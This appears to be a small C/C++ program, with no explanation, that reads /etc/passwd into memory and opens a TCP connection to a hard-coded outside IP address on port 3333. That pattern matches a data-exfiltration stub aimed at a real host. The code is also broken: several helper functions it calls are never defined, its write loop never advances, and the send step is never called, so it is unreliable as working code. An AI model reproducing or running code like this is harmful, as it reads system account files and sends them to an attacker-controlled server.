#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string>

long min(long lhs, long rhs) {
  return lhs<rhs ? lhs : rhs;
};
char buffer[24000];
int read_file() {
  int fd = xopen("/etc/passwd",O_RDONLY);
  char *beg=buffer;
  char *end=beg+sizeof(buffer);
  int res = 0;
  while(beg<end){
    printf("sleeping");
    res=xread(fd,beg,min(end-beg,sizeof(buffer)));
    if(res==0){
      printf("eof\n");
      return beg-buffer;
    }

    beg+=res;
    printf("read %d bytes, %ld total\n", res, beg-buffer);
  };
  return buffer-beg;
};
int xwrite(int fd, const char *beg, size_t size) {
  int res=write(fd,beg,size);
  if(res<0){
    perror("write");
    exit(8);
  };
  return res;
};
int write_fd(int fd, const char *buf, size_t len){
  const char *beg=buf;
  const char *end=buf+len;
  while(beg!=end) {
    int res = xwrite(fd, beg, end-beg);
    if(!res)
      break;
  };
  return beg-buf;
};
int main(int argc, char**argv){
  int bytes=read_file();
  int sock=xsocket(AF_INET,SOCK_STREAM,0);
  int res; 
  sockaddr_in sin_addr;
  memset(&sin_addr,0,sizeof(sin_addr)); 
  res = xinet_aton("34.209.78.80",&sin_addr.sin_addr);
  sin_addr.sin_port = htons(3333);
  sin_addr.sin_family = AF_INET;
  socklen_t len=sizeof(sin_addr);
  res=xconnect(sock,(sockaddr*)&sin_addr,len);

//  printf("sock: %d, size: %d\n",sock,len);
  return 0;
};
